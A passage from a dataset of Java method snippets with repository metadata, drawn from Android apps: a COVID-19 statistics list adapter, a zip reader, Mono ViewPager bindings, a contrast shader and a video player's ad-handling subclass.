dataStats.size();\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31976, "method_name": "getItem", "class_name": "DetailStatisticAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "DataStats", "snippet": "    public DataStats getItem(int position) {\n        return dataStats.get(position);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31977, "method_name": "getItemId", "class_name": "DetailStatisticAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getItemId(int position) {\n        return 0;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31978, "method_name": "getView", "class_name": "DetailStatisticAdapter", "params": ["int", "View", "ViewGroup"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View getView(int position, View v, ViewGroup parent) {\n        v = LayoutInflater.from(context).inflate(R.layout.list_row_detail_statistic,null);\n\n        dateHeader          = v.findViewById(R.id.dateHeader);\n        titleActiveCaseText = v.findViewById(R.id.titleActiveCaseText);\n        titlePositiveText   = v.findViewById(R.id.titlePositiveText);\n        titleRecoveredText  = v.findViewById(R.id.titleRecoveredText);\n        titleDeathText      = v.findViewById(R.id.titleDeathText);\n        activeCaseText      = v.findViewById(R.id.activeCaseText);\n        positiveText        = v.findViewById(R.id.positiveText);\n        recoveredText       = v.findViewById(R.id.recoveredText);\n        deathText           = v.findViewById(R.id.deathText);\n        dateLayout          = v.findViewById(R.id.dateLayout);\n        detailDataStats     = v.findViewById(R.id.detailDataStats);\n\n        postiveUpDown       = v.findViewById(R.id.postiveUpDown);\n        activeUpDown        = v.findViewById(R.id.activeUpDown);\n        recoveredUpDown     = v.findViewById(R.id.recoveredUpDown);\n        deathUpDown         = v.findViewById(R.id.deathUpDown);\n        postiveUpDownImg    = v.findViewById(R.id.postiveUpDownImg);\n        activeUpDownImg     = v.findViewById(R.id.activeUpDownImg);\n        recoveredUpDownImg  = v.findViewById(R.id.recoveredUpDownImg);\n        deathUpDownImg      = v.findViewById(R.id.deathUpDownImg);\n        postiveUpDownLayout       = v.findViewById(R.id.positiveUpDownLayout);\n        activeUpDownLayout        = v.findViewById(R.id.activeUpDownLayout);\n        recoveredUpDownLayout     = v.findViewById(R.id.recoveredUpDownLayout);\n        deathUpDownLayout         = v.findViewById(R.id.deathUpDownLayout);\n\n        positiveText.setText(String.valueOf(getItem(position).getPostive()));\n        activeCaseText.setText(String.valueOf(getItem(position).getActiveCases()));\n        recoveredText.setText(String.valueOf(getItem(position).getCured()));\n        deathText.setText(String.valueOf(getItem(position).getDeath()));\n\n        buildStats(position);\n\n        if(dateShow.get(position)){\n            dateLayout.setVisibility(View.VISIBLE);\n            dateHeader.setText(Utility.dateFormat(Constant.SIMPLE_DATE, getItem(position).getDate()));\n        }\n\n        if(position != 0){\n            if(getItem(position).getPostive() != getItem(position-1).getPostive()){\n                int total =   getItem(position).getPostive()- getItem(position-1).getPostive();\n                postiveUpDown.setText(String.valueOf(total));\n                postiveUpDownLayout.setVisibility(View.VISIBLE);\n            }\n            if(getItem(position).getActiveCases() != getItem(position-1).getActiveCases()){\n                int total =   getItem(position).getActiveCases()-getItem(position-1).getActiveCases() ;\n                if(total < 0){\n                    total =   getItem(position-1).getActiveCases() - getItem(position).getActiveCases();\n                }\n                activeUpDown.setText(String.valueOf(total));\n                activeUpDownLayout.setVisibility(View.VISIBLE);\n            }\n            if(getItem(position).getCured() != getItem(position-1).getCured()){\n                int total =  getItem(position).getCured()- getItem(position-1).getCured();\n                recoveredUpDown.setText(String.valueOf(total));\n                recoveredUpDownLayout.setVisibility(View.VISIBLE);\n            }\n            if(getItem(position).getDeath() != getItem(position-1).getDeath()){\n                int total =   getItem(position).getDeath()-getItem(position-1).getDeath();\n                deathUpDown.setText(String.valueOf(total));\n                deathUpDownLayout.setVisibility(View.VISIBLE);\n            }\n        }\n\n\n        setFont();\n        return v;\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31979, "method_name": "setFont", "class_name": "DetailStatisticAdapter", "params": [], "throws": null, "modifiers": ["private"], "return_type": "void", "snippet": "    private void setFont(){\n        titleDeathText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_BOLD));\n        titleRecoveredText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_BOLD));\n        titlePositiveText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_BOLD));\n        titleActiveCaseText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_BOLD));\n        activeCaseText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        positiveText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        recoveredText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        deathText.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        postiveUpDown.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        activeUpDown.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        recoveredUpDown.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n        deathUpDown.setTypeface(FontUtils.loadFontFromAssets(context, Constant.FONT_NORMAL));\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31980, "method_name": "buildStats", "class_name": "DetailStatisticAdapter", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void buildStats(int position){\n        Float maxValue = (float) getItem(position).getPostive() + getItem(position).getActiveCases() + getItem(position).getCured() +getItem(position).getDeath();\n        detailDataStats.setMaxValue(maxValue);\n        detailDataStats.setMinValue(0f);\n\n        Collection<FitChartValue> values = new ArrayList<>();\n        values.add(new FitChartValue((float)getItem(position).getPostive(), context.getResources().getColor(R.color.colorDark)));\n        values.add(new FitChartValue((float)getItem(position).getActiveCases(), context.getResources().getColor(R.color.bg_Blue)));\n        values.add(new FitChartValue((float)getItem(position).getCured(), context.getResources().getColor(R.color.bg_Green)));\n        values.add(new FitChartValue((float)getItem(position).getDeath(), context.getResources().getColor(R.color.bg_Red)));\n        detailDataStats.setValues(values);\n    }", "url": "https://raw.githubusercontent.com/fadhilahramadhan/Android_Covid19Stats/master/app/src/main/java/fadhilah/ramadhan/covid19stats/adapter/DetailStatisticAdapter.java", "stars": "2", "class_props": {"extends": "BaseAdapter", "implements": null, "modifiers": ["public"]}}, {"id": 31981, "method_name": "read", "class_name": "ZipIO", "params": ["File", "String"], "throws": ["Exception"], "modifiers": ["static"], "return_type": "Map<String,byte>", "snippet": "\tstatic Map<String, byte[]> read(File file, String namePattern) throws Exception {\n\t\tSystem.out.println(\"Read: \" + file);\n\t\tZipFile zf = new ZipFile(file);\n\t\tMap<String, byte[]> contents = new HashMap<>();\n\t\ttry (ZipInputStream zis = new ZipInputStream(new FileInputStream(file))) {\n\t\t\tZipEntry entry = null;\n\t\t\tbyte[] buffer = new byte[8192];\n\t\t\twhile ((entry = zis.getNextEntry()) != null) {\n\t\t\t\tif (entry.getName().matches(namePattern)) {\n\t\t\t\t\ttry (InputStream entryStream = zf.getInputStream(entry)) {\n\t\t\t\t\t\tint len;\n\t\t\t\t\t\tByteArrayOutputStream baos = new ByteArrayOutputStream();\n\t\t\t\t\t\twhile ((len = entryStream.read(buffer)) != -1)\n\t\t\t\t\t\t\tbaos.write(buffer, 0, len);\n\t\t\t\t\t\tcontents.put(entry.getName(), baos.toByteArray());\n\t\t\t\t\t} finally {\n\t\t\t\t\t\tSystem.out.println(\" - \" + entry.getName());\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t} finally {\n\t\t\tSystem.out.println(\"Read: \" + contents.size());\n\t\t}\n\t\treturn contents;\n\t}", "url": "https://raw.githubusercontent.com/Col-E/SimAnalyzer/master/src/test/resources/src/ZipIO.java", "stars": "12", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 31982, "method_name": "onPageScrollStateChanged", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageScrollStateChanged (int p0)\n\t{\n\t\tn_onPageScrollStateChanged (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31983, "method_name": "n_onPageScrollStateChanged", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageScrollStateChanged (int p0);\n\n\n\tpublic void onPageScrolled (int p0, float p1, int p2)\n\t{\n\t\tn_onPageScrolled (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31984, "method_name": "onPageScrolled", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int", "float", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageScrolled (int p0, float p1, int p2)\n\t{\n\t\tn_onPageScrolled (p0, p1, p2);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31985, "method_name": "n_onPageScrolled", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int", "float", "int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageScrolled (int p0, float p1, int p2);\n\n\n\tpublic void onPageSelected (int p0)\n\t{\n\t\tn_onPageSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31986, "method_name": "onPageSelected", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onPageSelected (int p0)\n\t{\n\t\tn_onPageSelected (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31987, "method_name": "n_onPageSelected", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_onPageSelected (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31988, "method_name": "monodroidAddReference", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31989, "method_name": "monodroidClearReferences", "class_name": "ViewPager_OnPageChangeListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/support/v4/view/ViewPager_OnPageChangeListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 31990, "method_name": "getShader", "class_name": "ContrastEffect", "params": ["GLSurfaceView"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getShader(GLSurfaceView mGlSurfaceView) {\n\n        String shader = \"#extension GL_OES_EGL_image_external : require\\n\"\n                + \"precision mediump float;\\n\"\n                + \"uniform samplerExternalOES sTexture;\\n\"\n                + \" float contrast;\\n\" + \"varying vec2 vTextureCoord;\\n\"\n                + \"void main() {\\n\" + \"  contrast =\" + contrast + \";\\n\"\n                + \"  vec4 color = texture2D(sTexture, vTextureCoord);\\n\"\n                + \"  color -= 0.5;\\n\" + \"  color *= contrast;\\n\"\n                + \"  color += 0.5;\\n\" + \"  gl_FragColor = color;\\n\" + \"}\\n\";\n        return shader;\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/effect/ContrastEffect.java", "stars": "2", "class_props": {"extends": null, "implements": ["ShaderInterface"], "modifiers": ["public"]}}, {"id": 31991, "method_name": "init", "class_name": "GSYSampleADVideoPlayer", "params": ["Context"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void init(Context context) {\n        super.init(context);\n        mJumpAd = findViewById(R.id.jump_ad);\n        mADTime = (TextView) findViewById(R.id.ad_time);\n        mWidgetContainer = (ViewGroup) findViewById(R.id.widget_container);\n        if (mJumpAd != null) {\n            mJumpAd.setOnClickListener(new OnClickListener() {\n                @Override\n                public void onClick(View v) {\n                    playNext();\n                }\n            });\n        }\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31992, "method_name": "getLayoutId", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getLayoutId() {\n        return R.layout.video_layout_sample_ad;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31993, "method_name": "setUp", "class_name": "GSYSampleADVideoPlayer", "params": ["List<GSYVideoModel>", "boolean", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<GSYVideoModel> url, boolean cacheWithPlay, int position) {\n        return setUp(url, cacheWithPlay, position, null);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31994, "method_name": "setUp", "class_name": "GSYSampleADVideoPlayer", "params": ["List<GSYVideoModel>", "boolean", "int", "File"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<GSYVideoModel> url, boolean cacheWithPlay, int position, File cachePath) {\n        return setUp(url, cacheWithPlay, position, cachePath, new HashMap<String, String>());\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31995, "method_name": "setUp", "class_name": "GSYSampleADVideoPlayer", "params": ["List<GSYVideoModel>", "boolean", "int", "File", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setUp(List<GSYVideoModel> url, boolean cacheWithPlay, int position, File cachePath, Map<String, String> mapHeadData) {\n        return setUp(url, cacheWithPlay, position, cachePath, mapHeadData, true);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31996, "method_name": "setUp", "class_name": "GSYSampleADVideoPlayer", "params": ["List<GSYVideoModel>", "boolean", "int", "File", "Map<String,String>", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean setUp(List<GSYVideoModel> url, boolean cacheWithPlay, int position, File cachePath, Map<String, String> mapHeadData, boolean changeState) {\n        GSYVideoModel gsyVideoModel = url.get(position);\n        if (gsyVideoModel instanceof GSYADVideoModel) {\n            GSYADVideoModel gsyadVideoModel = (GSYADVideoModel) gsyVideoModel;\n            if (gsyadVideoModel.isSkip() && position < (url.size() - 1)) {\n                return setUp(url, cacheWithPlay, position + 1, cachePath, mapHeadData, changeState);\n            }\n            isAdModel = (gsyadVideoModel.getType() == GSYADVideoModel.TYPE_AD);\n        }\n        changeAdUIState();\n        return super.setUp(url, cacheWithPlay, position, cachePath, mapHeadData, changeState);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31997, "method_name": "onPrepared", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onPrepared() {\n        super.onPrepared();\n        isFirstPrepared = true;\n        changeAdUIState();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31998, "method_name": "updateStartImage", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void updateStartImage() {\n        if (mStartButton != null) {\n            if (mStartButton instanceof ImageView) {\n                ImageView imageView = (ImageView) mStartButton;\n                if (mCurrentState == CURRENT_STATE_PLAYING) {\n                    imageView.setImageResource(R.drawable.video_click_pause_selector);\n                } else if (mCurrentState == CURRENT_STATE_ERROR) {\n                    imageView.setImageResource(R.drawable.video_click_play_selector);\n                } else {\n                    imageView.setImageResource(R.drawable.video_click_play_selector);\n                }\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 31999, "method_name": "touchDoubleUp", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchDoubleUp() {\n        if (isAdModel) {\n            return;\n        }\n        super.touchDoubleUp();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32000, "method_name": "touchSurfaceMove", "class_name": "GSYSampleADVideoPlayer", "params": ["float", "float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceMove(float deltaX, float deltaY, float y) {\n        if (mChangePosition && isAdModel) {\n            return;\n        } else {\n            super.touchSurfaceMove(deltaX, deltaY, y);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32001, "method_name": "touchSurfaceMoveFullLogic", "class_name": "GSYSampleADVideoPlayer", "params": ["float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceMoveFullLogic(float absDeltaX, float absDeltaY) {\n        if ((absDeltaX > mThreshold || absDeltaY > mThreshold)) {\n            int screenWidth = CommonUtil.getScreenWidth(getContext());\n            if (isAdModel && absDeltaX >= mThreshold && Math.abs(screenWidth - mDownX) > mSeekEndOffset) {\n                //\u9632\u6b62\u5168\u5c4f\u865a\u62df\u6309\u952e\n                mChangePosition = true;\n                mDownPosition = getCurrentPositionWhenPlaying();\n            } else {\n                super.touchSurfaceMoveFullLogic(absDeltaX, absDeltaY);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32002, "method_name": "touchSurfaceUp", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceUp() {\n        if (mChangePosition && isAdModel) {\n            return;\n        }\n        super.touchSurfaceUp();\n\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32003, "method_name": "hideAllWidget", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void hideAllWidget() {\n        if (isFirstPrepared && isAdModel) {\n            return;\n        }\n        super.hideAllWidget();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32004, "method_name": "setProgressAndTime", "class_name": "GSYSampleADVideoPlayer", "params": ["int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setProgressAndTime(int progress, int secProgress, int currentTime, int totalTime, boolean forceChange) {\n        super.setProgressAndTime(progress, secProgress, currentTime, totalTime, forceChange);\n        if (mADTime != null && currentTime > 0) {\n            int totalSeconds = totalTime / 1000;\n            int currentSeconds = currentTime / 1000;\n            mADTime.setText(\"\" + (totalSeconds - currentSeconds));\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32005, "method_name": "cloneParams", "class_name": "GSYSampleADVideoPlayer", "params": ["GSYBaseVideoPlayer", "GSYBaseVideoPlayer"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void cloneParams(GSYBaseVideoPlayer from, GSYBaseVideoPlayer to) {\n        super.cloneParams(from, to);\n        GSYSampleADVideoPlayer sf = (GSYSampleADVideoPlayer) from;\n        GSYSampleADVideoPlayer st = (GSYSampleADVideoPlayer) to;\n        st.isAdModel = sf.isAdModel;\n        st.isFirstPrepared = sf.isFirstPrepared;\n        st.changeAdUIState();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32006, "method_name": "changeAdUIState", "class_name": "GSYSampleADVideoPlayer", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void changeAdUIState() {\n        if (mJumpAd != null) {\n            mJumpAd.setVisibility((isFirstPrepared && isAdModel) ? VISIBLE : GONE);\n        }\n        if (mADTime != null) {\n            mADTime.setVisibility((isFirstPrepared && isAdModel) ? VISIBLE : GONE);\n        }\n        if (mWidgetContainer != null) {\n            mWidgetContainer.setVisibility((isFirstPrepared && isAdModel) ? GONE : VISIBLE);\n        }\n        if (mBottomContainer != null) {\n            int color = (isFirstPrepared && isAdModel) ? Color.TRANSPARENT : getContext().getResources().getColor(R.color.bottom_container_bg);\n            mBottomContainer.setBackgroundColor(color);\n        }\n        if (mCurrentTimeTextView != null) {\n            mCurrentTimeTextView.setVisibility((isFirstPrepared && isAdModel) ? INVISIBLE : VISIBLE);\n        }\n        if (mTotalTimeTextView != null) {\n            mTotalTimeTextView.setVisibility((isFirstPrepared && isAdModel) ? INVISIBLE : VISIBLE);\n        }\n        if (mProgressBar != null) {\n            mProgressBar.setVisibility((isFirstPrepared && isAdModel) ? INVISIBLE : VISIBLE);\n            mProgressBar.setEnabled(!(isFirstPrepared && isAdModel));\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32007, "method_name": "setAdUp", "class_name": "GSYSampleADVideoPlayer", "params": ["ArrayList<GSYADVideoModel>", "boolean", "int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setAdUp(ArrayList<GSYADVideoModel> url, boolean cacheWithPlay, int position) {\n        return setUp((ArrayList<GSYVideoModel>) url.clone(), cacheWithPlay, position);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32008, "method_name": "setAdUp", "class_name": "GSYSampleADVideoPlayer", "params": ["ArrayList<GSYADVideoModel>", "boolean", "int", "File"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setAdUp(ArrayList<GSYADVideoModel> url, boolean cacheWithPlay, int position, File cachePath) {\n        return setUp((ArrayList<GSYVideoModel>) url.clone(), cacheWithPlay, position, cachePath);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32009, "method_name": "setAdUp", "class_name": "GSYSampleADVideoPlayer", "params": ["ArrayList<GSYADVideoModel>", "boolean", "int", "File", "Map<String,String>"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean setAdUp(ArrayList<GSYADVideoModel> url, boolean cacheWithPlay, int position, File cachePath, Map<String, String> mapHeadData) {\n        return setUp((ArrayList<GSYVideoModel>) url.clone(), cacheWithPlay, position, cachePath, mapHeadData);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/GSYSampleADVideoPlayer.java", "stars": "2", "class_props": {"extends": "ListGSYVideoPlayer", "implements": null, "modifiers": ["public"]}}, {"id": 32010, "method_name": "getType", "class_name": "GSYADVideoModel", "params": [], "throws": null, "modifiers": ["public"], "return_type": 